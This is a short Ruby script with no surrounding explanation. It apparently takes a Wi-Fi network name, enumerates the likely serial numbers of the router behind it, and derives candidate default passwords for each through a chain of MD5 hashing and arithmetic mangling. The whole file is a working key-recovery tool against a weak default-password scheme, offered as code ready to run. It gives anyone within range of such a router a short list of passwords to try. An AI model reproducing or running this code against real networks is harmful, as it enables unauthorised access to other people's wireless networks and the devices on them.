require 'digest/md5'

PREFIXES = ['SAAP', 'SBAP', 'SAPP']

def predict_serials ssid
  ssid = ssid[3,10].to_i
  serials = []
  for i in 0..4
    for p0 in 0..9
      base_num = (ssid / 100) + 25000 + i * 50000 - p0 * 25000
      a = base_num / 68
      next if a < 0 or a > 999

      while true
        p3 = base_num - a * 68
        break if p3 < 0 or p3 > 99

        p1 = a / 10
        p2 = a % 10
        p4 = ssid % 100

        serial = p0 * 10000000 + p1 * 100000 + p2 * 10000 + p3 * 100 + p4
        serials.push serial
        break if a == 0
        a -= 1
      end
    end
  end
  serials
end

def multi a, b
  result = []
  if (a < 32767 and b < 65536)
    result[0] = a * b
    result[1] = (result[0] < 0) ? -1 : 0
    return result
  end

  a00 = a & 0xFFFF
  a16 = a >> 16
  b00 = b & 0xFFFF
  b16 = b >> 16
  c00 = a00 * b00
  c16 = (c00 >> 16) + (a16 * b00)
  c32 = c16 >> 16
  c16 = (c16 & 0xFFFF) + (a00 * b16)
  c32 = c32 + (c16 >> 16)
  c48 = c32 >> 16
  c32 = (c32 & 0xFFFF) + (a16 * b16)
  c48 = c48 + (c32 >> 16)

  result[0] = ((c16 & 0xFFFF) << 16) | (c00 & 0xFFFF)
  result[1] = ((c48 & 0xFFFF) << 16) | (c32 & 0xFFFF)
  result
end

def mangle pp
  a = (((multi(pp[3], 0x68de3af))[1] >> 8) - (pp[3] >> 31)) % 0x100000000
  b = ((pp[3] - a * 9999 + 1) * 11) % 0x100000000
  (b * (pp[1] * 100 + pp[2] * 10 + pp[0])) % 0x100000000
end

def hash_to_pass in_hash
  result = ''
  for i in 0..7
    a = Integer(in_hash[i * 2, 2], 16) & 0x1f
    a -= ((multi(a, 0xb21642c9)[1] >> 4) * 23)
    a = (a & 0xff) + 0x41
    a+=1 if a >= 73 #'I'
    a+=1 if a >= 76 #'L'
    a+=1 if a >= 79 #'O'
    result += a.chr
  end
  result
end

def serial_to_pass serial
  md5res = Digest::MD5.hexdigest(serial)
  nums = []
  for i in 0..7
    str = md5res[i * 4, 4]
    nums.push(Integer(str[2,4] + str[0,2], 16))
  end
  w1 = mangle(nums[0, 4])
  w2 = mangle(nums[4, 8])
  md5inp = (w1.to_s(16).rjust(8, '0') + w2.to_s(16).rjust(8, '0')).upcase
  hash_to_pass(Digest::MD5.hexdigest(md5inp))
end

def predict_passwords ssid
  predict_serials(ssid).product(PREFIXES).map do |serial, prefix|
    serial_to_pass(prefix + serial.to_s.rjust(8, '0'))
  end
end
